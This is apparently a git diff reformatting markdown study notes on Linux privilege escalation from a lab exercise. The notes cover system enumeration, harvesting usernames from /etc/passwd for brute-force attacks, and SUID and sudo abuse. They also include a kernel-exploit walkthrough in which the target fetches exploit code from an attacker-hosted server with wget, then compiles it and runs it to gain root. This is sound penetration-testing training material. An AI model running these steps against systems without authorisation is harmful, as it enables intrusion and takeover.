@@ -54,22 +54,22 @@
 * Shows processes that are not attached to a terminal (x).
 * Output gives a better understanding of the system and potential vulnerabilities.
 
-#### `env`
+### `env`
 * Show environmental variables.
 * `PATH` variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
 
-#### `sudo -l`
+### `sudo -l`
 * The target system may be configured to allow users to run some (or all) commands with root privileges.
 * Used to list all commands the current user can run using sudo.
 
-#### `ls`
+### `ls`
 * Always use `ls -la` while looking for potential privilege escalation vectors.
 
-#### `Id`
+### `Id`
 * Provides a general overview of the user’s privilege level and group memberships.
 * Can be used to obtain the same information for another user.
 
-#### `/etc/passwd`
+### `/etc/passwd`
 * Reading the `/etc/passwd` file with 'cat' can be an easy way to discover users on the system.
 * Output can be easily cut and converted to a useful list for brute-force attacks.
 ```
@@ -80,18 +80,18 @@ cat /etc/passwd | cut -d ":" -f 1
 cat /etc/passwd | grep home
 ```
 
-#### `history`
+### `history`
 * Looking at earlier commands with the `history` command can give some idea about the target system.
 * Rarely has stored information such as passwords or usernames.
 
-#### `ifconfig`
+### `ifconfig`
 * Gives information about the network interfaces of the system.
 * Target system may be a pivoting point to another network.
   * Target may have three interfaces (eth0, tun0, and tun1).
   * Attacker can reach the eth0 interface but can not directly access the two other networks.
   * Confirm using `ip route` command to see which network routes exist. 
 
-#### `netstat`
+### `netstat`
 * Worth looking into existing communications.
 * Used with several different options to gather information on existing connections.
   * `netstat -a`: shows all listening ports and established connections.
@@ -110,7 +110,7 @@ cat /etc/passwd | grep home
   * `-n`: Do not resolve names
   * `-o`: Display timers
 
-#### `find` Command
+### `find` Command
 * Searching the target system for important information and potential privilege escalation vectors can be fruitful.
 
 | Command | Purpose
@@ -119,7 +119,7 @@ cat /etc/passwd | grep home
 | `find /home -name flag1.txt` | Find the file names `flag1.txt` in the `/home` directory.
 | `find / -type d -name config` | Find the directory named config under `/`.
 | `find / -type f -perm 0777` | Find files with the 777 permissions (files readable, writable, and executable by all users).
-| `find / -perm a=x` find executable files.
+| `find / -perm a=x` | Find executable files.
 | `find /home -user frank` | Find all files for user `frank` under `/home`.
 | `find / -mtime 10` | Find files that were modified in the last 10 days.
 | `find / -atime 10` | Find files that were accessed in the last 10 day.
@@ -127,39 +127,31 @@ cat /etc/passwd | grep home
 | `find / -amin -60` | Find files accessed within the last hour (60 minutes).
 | `find / -size 50M` | Find files with a 50 MB size. This command can also be used with `+` and `-` signs to specify a file that is larger or smaller than the given size.
 
-* Tends to generate errors which can make output hard to read.
-  * Use `find -type f 2>/dev/null` to redirect errors to `/dev/null` and have a cleaner output.
+* Use `find -type f 2>/dev/null` to redirect errors to `/dev/null` and have a cleaner output.
 * Folders and files that can be written to or executed from.
 
-| Command | Purpose 
-| --- | ---
-| `find / -writable -type d 2>/dev/null` | Find world-writeable folders.
-| `find / -perm -222 -type d 2>/dev/null` | Find world-writeable folders.
-| `find / -perm -o w -type d 2>/dev/null` | Find world-writeable folders.
+`find / -writable -type d 2>/dev/null` : Find world-writeable folders.
+`find / -perm -222 -type d 2>/dev/null` : Find world-writeable folders.
+`find / -perm -o w -type d 2>/dev/null` : Find world-writeable folders.
 
 * `perm` parameter affects how `find` works.
-  * `find / -perm -o x -type d 2>/dev/null` find world-executable folders.
+  * `find / -perm -o x -type d 2>/dev/null` finds world-executable folders.
 * Find development tools and supported languages.
-```
-find / -name perl*
-```
-```
-find / -name python*
-```
-```
-find / -name gcc*
-```
-* Find files that have the SUID bit set.
-  * SUID bit allows the file to run with the privilege level of the account that owns it rather than the account which runs it.
+
+`find / -name perl*`
+`find / -name python*`
+find / -name gcc*`
+
+* SUID bit allows the file to run with the privilege level of the account that owns it rather than the account which runs it.
   * Allows for an interesting privilege escalation path.
 ```
 find / -perm -u=s -type f 2>/dev/null
 ``` 
 
 ## Automated Enumeration Tools
-* These tools should only be used to save time knowing they may miss some privilege escalation vectors.
+* Tools should only be used to save time knowing they may miss some privilege escalation vectors.
 * Target system’s environment will influence the tool to use.
-  * Cannot run a tool written in Python if it is not installed on the target system.
+  * E.g. cannot run a tool written in Python if it is not installed on the target system.
 * [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
 * [LinEnum](https://github.com/rebootuser/LinEnum).
 * [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester).
@@ -174,9 +166,9 @@ find / -perm -u=s -type f 2>/dev/null
   * Requires the kernel to have specific privileges.
   * Successful exploit will potentially lead to root privileges.
 * Kernel exploit methodology is simple.
-  * Identify the kernel version.
-  * Search and find an exploit code for the kernel version of the target system.
-  * Run the exploit.
+1. Identify the kernel version.
+2. Search and find an exploit code for the kernel version of the target system.
+3. Run the exploit.
 * Failed kernel exploits can lead to a system crash.
   * Ensure this potential outcome is acceptable within the scope of the penetration testing engagement before attempting a kernel exploit.
 
@@ -188,7 +180,7 @@ find / -perm -u=s -type f 2>/dev/null
   * Can generate false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
 
 ### Hints/Notes
-* Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.
+* Be specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.
 * Understand how the exploit code works BEFORE launching it.
 * Some exploit codes can make changes on the OS that would make them insecure in further use or make irreversible changes to the system.
   * This creates problems later.
@@ -197,25 +189,25 @@ find / -perm -u=s -type f 2>/dev/null
 * Read all comments and instructions provided with the exploit code.
 * Transfer exploit code from the attacking machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
 
-## The steps of the Kernel exploit Methodology
-* Identify the kernel version.
+## Kernel exploit Methodology
+1. Identify the kernel version.
 ```
 uname -a
 ```
-* Find an exploit code for the kernel version of the target system.
+2. Find an exploit code for the kernel version of the target system.
   * Use [Exploit Database](https://www.exploit-db.com) to search for an existing exploit code.
-* Download the exploit to the attacking machine.
-* Serve the exploit code to the target using `SimpleHTTPServer` Python module.
+3. Download the exploit to the attacking machine.
+4. Serve the exploit code to the target using `SimpleHTTPServer` Python module.
 ```
 python3 -m http.server 9000
 ```
-* Use `wget` on target machine to copy the code across.
+5. Use `wget` on target machine to copy the code across.
 ```
 wget http://10.10.166.35:9000/37392.c -P /tmp/
 ```
   * `-P` option specifies that the file should be saved to the `/tmp/` directory on the target.
   * Specify the path as `/tmp/` where the file be downloaded to avoid the permission error while running `wget` because you are a low-level privilege user (karen).
-* Run the exploit file to perform privilege escalation.
+6. Run the exploit file to perform privilege escalation.
 > Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
   * Rename exploit file.
 ```
@@ -230,14 +222,14 @@ gcc ofs.c -o ofs
   * `ofs.c` file contains the C source code that will be compiled into the executable file.
   * `-o` option specifies the output file name, which in this case is `ofs`.
  * Type `./ofs` to run the compiled executable file.
-* Verify that root privilege has been gained.
+7. Verify that root privilege has been gained.
 ```
 # id
 uid=0(root) gid=0(root) groups=0(root),1001(karen)
 ```
 
 ## Privilege Escalation: Sudo
-* Under some conditions system administrators may need to give regular users some flexibility on their privileges.
+* System administrators may need to give regular users some flexibility on their privileges.
 * Check current root privileges using `sudo -l` command.
 * [GTFOBins](https://gtfobins.github.io/) provides information on how a user with sudo rights on a program can abuse it.
   * E.g. user has sudo rights on `nmap` command.
